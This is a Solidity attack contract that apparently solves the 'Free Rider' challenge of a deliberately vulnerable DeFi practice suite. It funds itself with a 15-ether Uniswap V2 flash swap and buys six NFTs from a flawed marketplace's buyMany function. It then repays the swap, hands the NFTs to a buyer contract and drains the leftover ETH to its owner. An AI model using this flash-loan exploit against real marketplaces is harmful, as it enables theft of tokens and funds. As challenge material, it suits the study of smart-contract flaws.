// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "../../src/uniswap/IUniswapV2Pair.sol";
import "../../src/uniswap/IUniswapV2Router02.sol";
import "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import "../../src/IWETH.sol";

contract FreeRiderAttacker {
    using Address for address payable;

    IUniswapV2Pair private pair;
    IUniswapV2Router02 private router;
    FreeRiderNFTMarketplace private marketplace;
    address private buyerContract;
    address private owner;

    constructor(
        address _pair,
        address _router,
        address payable _marketplace,
        address _buyerContract
    ) {
        pair = IUniswapV2Pair(_pair);
        router = IUniswapV2Router02(_router);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        buyerContract = _buyerContract;
        owner = msg.sender;
    }

    function attack() external {
        address token0 = pair.token0();
        uint256 amount0Out = 15 ether;
        uint256 amount1Out;
        address weth = router.WETH();
        if (token0 != weth) {
            (amount0Out, amount1Out) = (amount1Out, amount0Out);
        }
        pair.swap(amount0Out, amount1Out, address(this), hex"00");
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        address weth = router.WETH();
        IWETH(weth).withdraw(15 ether);

        uint256 i;
        uint256[] memory ids = new uint256[](6);
        for (i = 0; i != 6; ++i) {
            ids[i] = i;
        }
        marketplace.buyMany{value: 15 ether}(ids);

        uint256 repayment = 20 ether;
        IWETH(weth).deposit{value: repayment}();
        IWETH(weth).transfer(address(pair), repayment);

        IERC721 nft = IERC721(marketplace.token());
        for (i = 0; i != 6; ++i) {
            nft.safeTransferFrom(address(this), buyerContract, i);
        }

        payable(owner).sendValue(address(this).balance);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
